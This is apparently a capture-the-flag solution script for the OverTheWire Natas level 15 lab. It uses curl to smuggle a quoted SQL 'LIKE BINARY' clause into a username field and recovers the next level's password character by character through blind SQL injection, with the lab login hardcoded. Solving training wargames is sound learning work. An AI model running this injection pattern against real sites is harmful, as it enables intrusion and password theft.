#!/usr/bin/env python3
import os

password = list("a")
endIndex = 0

def increment(password, endIndex):
    if (password[endIndex] == "z"):
        password[endIndex] = "A"
    elif (password[endIndex] == "Z"):
        password[endIndex] = "0"
    else:
        password[endIndex] = chr(ord(password[endIndex]) + 1)

while (endIndex < 32):
    print(f"Trying: {"".join(password)}")
    if (not os.system(f'curl -s -u natas15:SdqIqBsFcz3yotlNYErZSZwblkm0lrvx natas15.natas.labs.overthewire.org?username=natas16%22%20AND%20password%20LIKE%20BINARY%20%22{"".join(password)}%25 | grep -qE "This user exists"')):
        endIndex += 1
        if (endIndex < 32):
            password.append("a")
    else:
        increment(password, endIndex)
print("Password is: ", end="")
print("".join(password))


